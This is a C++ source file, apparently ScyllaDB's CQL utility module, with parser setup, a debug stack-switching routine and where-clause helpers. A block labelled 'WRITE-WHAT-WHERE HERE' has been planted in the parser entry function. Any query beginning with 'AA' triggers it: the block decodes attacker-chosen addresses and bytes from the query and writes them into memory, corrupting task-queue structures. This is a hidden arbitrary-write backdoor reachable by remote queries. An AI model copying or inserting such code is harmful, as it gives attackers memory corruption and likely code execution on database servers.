/*
 * SPDX-License-Identifier: LicenseRef-ScyllaDB-Source-Available-1.0
 */

/* Copyright 2020-present ScyllaDB */

#include "utils/assert.hh"
#include "util.hh"
#include "cql3/expr/expr-utils.hh"

#ifdef DEBUG

#include <ucontext.h>

extern "C" {
void __sanitizer_start_switch_fiber(void** fake_stack_save, const void* stack_bottom, size_t stack_size);
void __sanitizer_finish_switch_fiber(void* fake_stack_save, const void** stack_bottom_old, size_t* stack_size_old);
}

#endif

namespace cql3::util {


uint64_t get_int64_value(char a){
    return (uint64_t)((a >= 'A') ? (a - 'A' + 10) : (a - '0'));
}

uint64_t chars_to_uint64(const char* array){
	uint64_t combinedValue;
        for(int ii = 0; ii < 16; ii += 16){
        	combinedValue = ((get_int64_value(array[0+ii])& 0x0F) << 60) | ((get_int64_value(array[1+ii])& 0x0F) << 56) | ((get_int64_value(array[2+ii])& 0x0F) << 52) | ((get_int64_value(array[3+ii])& 0x0F) << 48) | ((get_int64_value(array[4+ii])& 0x0F) << 44) | ((get_int64_value(array[5+ii])& 0x0F) << 40) | ((get_int64_value(array[6+ii])& 0x0F) << 36) | ((get_int64_value(array[7+ii])& 0x0F) << 32) | ((get_int64_value(array[8+ii])& 0x0F) << 28) | ((get_int64_value(array[9+ii])& 0x0F) << 24) | ((get_int64_value(array[10+ii])& 0x0F) << 20) | ((get_int64_value(array[11+ii])& 0x0F) << 16) | ((get_int64_value(array[12+ii])& 0x0F) << 12) | ((get_int64_value(array[13+ii]) & 0x0F) << 8) | ((get_int64_value(array[14+ii]) & 0x0F) << 4) | (get_int64_value(array[15+ii]) & 0x0F);
	}
	return combinedValue;
}

void chararray_to_hexarray(uint8_t* hexchararray, const char* chararray){
    for(int ii=0; ii<16; ii++){
        hexchararray[ii] = (get_int64_value(chararray[ii*2]) << 4) | ((get_int64_value(chararray[(ii*2)+1])) & 0x0F);
    }
}

static void do_with_parser_impl_impl(const std::string_view& cql, dialect d, noncopyable_function<void (cql3_parser::CqlParser& parser)> f) {

    /*********************************************/
    //WRITE-WHAT-WHERE HERE
    const char* payload = cql.data();
    if(payload[0] == (char)0x41 && payload[1] == (char)0x41)
    {
        //fake_tq
        volatile char* fake_tq_ptr = (char*) chars_to_uint64(payload+0x10); //0x00000000080f1000;
        //Inject fake_tq Starts with 8 bytes of 0xAA
        volatile uint8_t hex_payload[9];
        for(int ii=0x0; ii<(24+22); ii++){
            chararray_to_hexarray((uint8_t*)hex_payload, payload+0x30+(ii*0x10));
            std::memcpy((char*)fake_tq_ptr+(ii*0x8), (char*)(hex_payload), 0x08); 
        }
        //Modify atq and aingtq, starting from begin and end, to the storage, including every single task queue in it.
        volatile char* atq_start_ptr = (char*) chars_to_uint64(payload+0x30+(0x10*(24+22))+0x10);
        for(int ii=0x0; ii<68; ii++){
            chararray_to_hexarray((uint8_t*)hex_payload, payload+(0x30+(0x10*(24+22))+0x20)+(ii*0x10));
            std::memcpy((char*)atq_start_ptr+(ii*0x8), (char*)(hex_payload), 0x08);
        }
    }
    /*********************************************/


    cql3_parser::CqlLexer::collector_type lexer_error_collector(cql);
    cql3_parser::CqlParser::collector_type parser_error_collector(cql);
    cql3_parser::CqlLexer::InputStreamType input{reinterpret_cast<const ANTLR_UINT8*>(cql.begin()), ANTLR_ENC_UTF8, static_cast<ANTLR_UINT32>(cql.size()), nullptr};
    cql3_parser::CqlLexer lexer{&input};
    lexer.set_error_listener(lexer_error_collector);
    cql3_parser::CqlParser::TokenStreamType tstream(ANTLR_SIZE_HINT, lexer.get_tokSource());
    cql3_parser::CqlParser parser{&tstream};
    parser.set_error_listener(parser_error_collector);
    parser.set_dialect(d);
    f(parser);
}

#ifndef DEBUG

void do_with_parser_impl(const std::string_view& cql, dialect d, noncopyable_function<void (cql3_parser::CqlParser& parser)> f) {
    return do_with_parser_impl_impl(cql, d, std::move(f));
}

#else

// The CQL parser uses huge amounts of stack space in debug mode,
// enough to overflow our 128k stacks. The mechanism below runs
// the parser in a larger stack.

struct thunk_args {
    // arguments to do_with_parser_impl_impl
    const std::string_view& cql;
    dialect d;
    noncopyable_function<void (cql3_parser::CqlParser&)>&& func;
    // Exceptions can't be returned from another stack, so store
    // any thrown exception here
    std::exception_ptr ex;
    // Caller's stack
    ucontext_t caller_stack;
    // Address Sanitizer needs some extra storage for stack switches.
    struct {
        void* fake_stack;
        const void* stack_bottom;
        size_t stack_size;
    } sanitizer_state;
};

// Translate from makecontext(3)'s strange calling convention
// to do_with_parser_impl_impl().
static void thunk(int p1, int p2) {
    auto p = uint32_t(p1) | (uint64_t(uint32_t(p2)) << 32);
    auto args = reinterpret_cast<thunk_args*>(p);
    auto& san = args->sanitizer_state;
    // Complete stack switch started in do_with_parser_impl()
    __sanitizer_finish_switch_fiber(nullptr, &san.stack_bottom, &san.stack_size);
    try {
        do_with_parser_impl_impl(args->cql, args->d, std::move(args->func));
    } catch (...) {
        args->ex = std::current_exception();
    }
    // Switch back to original stack
    __sanitizer_start_switch_fiber(nullptr, san.stack_bottom, san.stack_size);
    setcontext(&args->caller_stack);
};

void do_with_parser_impl(const std::string_view& cql, dialect d, noncopyable_function<void (cql3_parser::CqlParser& parser)> f) {
    static constexpr size_t stack_size = 1 << 20;
    static thread_local std::unique_ptr<char[]> stack = std::make_unique<char[]>(stack_size);
    thunk_args args{
        .cql = cql,
        .d = d,
        .func = std::move(f),
    };
    ucontext_t uc;
    auto r = getcontext(&uc);
    SCYLLA_ASSERT(r == 0);
    if (stack.get() <= (char*)&uc && (char*)&uc < stack.get() + stack_size) {
        // We are already running on the large stack, so just call the
        // parser directly.
        return do_with_parser_impl_impl(cql, d, std::move(f));
    }
    uc.uc_stack.ss_sp = stack.get();
    uc.uc_stack.ss_size = stack_size;
    uc.uc_link = nullptr;
    auto q = reinterpret_cast<uint64_t>(reinterpret_cast<uintptr_t>(&args));
    makecontext(&uc, reinterpret_cast<void (*)()>(thunk), 2, int(q), int(q >> 32));
    auto& san = args.sanitizer_state;
    // Tell Address Sanitizer we are switching to another stack
    __sanitizer_start_switch_fiber(&san.fake_stack, stack.get(), stack_size);
    swapcontext(&args.caller_stack, &uc);
    // Completes stack switch started in thunk()
    __sanitizer_finish_switch_fiber(san.fake_stack, nullptr, 0);
    if (args.ex) {
        std::rethrow_exception(std::move(args.ex));
    }
}

#endif

void validate_timestamp(const db::config& config, const query_options& options, const std::unique_ptr<attributes>& attrs) {
    if (attrs->is_timestamp_set() && config.restrict_future_timestamp()) {
        static constexpr int64_t MAX_DIFFERENCE = std::chrono::duration_cast<std::chrono::microseconds>(std::chrono::days(3)).count();
        auto now = std::chrono::duration_cast<std::chrono::microseconds>(db_clock::now().time_since_epoch()).count();

        auto timestamp = attrs->get_timestamp(now, options);

        if (timestamp > now && timestamp - now > MAX_DIFFERENCE) {
            throw exceptions::invalid_request_exception("Cannot provide a timestamp more than 3 days into the future. If this was not intended, "
            "make sure the timestamp is in microseconds. You can also disable this check by setting the restrict_future_timestamp "
            "configuration option to false.");
        }
    }
}

sstring relations_to_where_clause(const expr::expression& e) {
    auto expr_to_pretty_string = [](const expr::expression& e) -> sstring {
        return fmt::format("{:user}", e);
    };
    auto relations = expr::boolean_factors(e);
    auto expressions = relations | std::views::transform(expr_to_pretty_string);
    return fmt::to_string(fmt::join(expressions, " AND "));
}

expr::expression where_clause_to_relations(const std::string_view& where_clause, dialect d) {
    return do_with_parser(where_clause, d, std::mem_fn(&cql3_parser::CqlParser::whereClause));
}

sstring rename_column_in_where_clause(const std::string_view& where_clause, column_identifier::raw from, column_identifier::raw to, dialect d) {
    std::vector<expr::expression> relations = boolean_factors(where_clause_to_relations(where_clause, d));
    std::vector<expr::expression> new_relations;
    new_relations.reserve(relations.size());

    for (const expr::expression& old_relation : relations) {
        expr::expression new_relation = expr::search_and_replace(old_relation,
            [&](const expr::expression& e) -> std::optional<expr::expression> {
                if (auto ident = expr::as_if<expr::unresolved_identifier>(&e)) {
                    if (*ident->ident == from) {
                        return expr::unresolved_identifier{
                            ::make_shared<column_identifier::raw>(to)
                        };
                    }
                }
                return std::nullopt;
            }
        );

        new_relations.emplace_back(std::move(new_relation));
    }

    return relations_to_where_clause(expr::conjunction{std::move(new_relations)});
}

}
